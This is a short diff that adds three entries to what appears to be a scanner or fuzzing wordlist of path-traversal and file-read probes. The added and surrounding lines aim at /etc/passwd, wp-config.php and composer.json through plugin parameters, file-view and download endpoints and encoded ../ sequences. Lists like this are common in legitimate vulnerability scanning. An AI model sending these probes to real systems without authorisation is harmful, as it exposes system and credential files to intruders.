@@ -498,3 +498,6 @@
 /?hippoo_serve=../../../../../../../etc/passwd
 /?hippoo_serve=../../../../wp-config.php
 /workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
+/cache/original/%2e%2e/composer.json
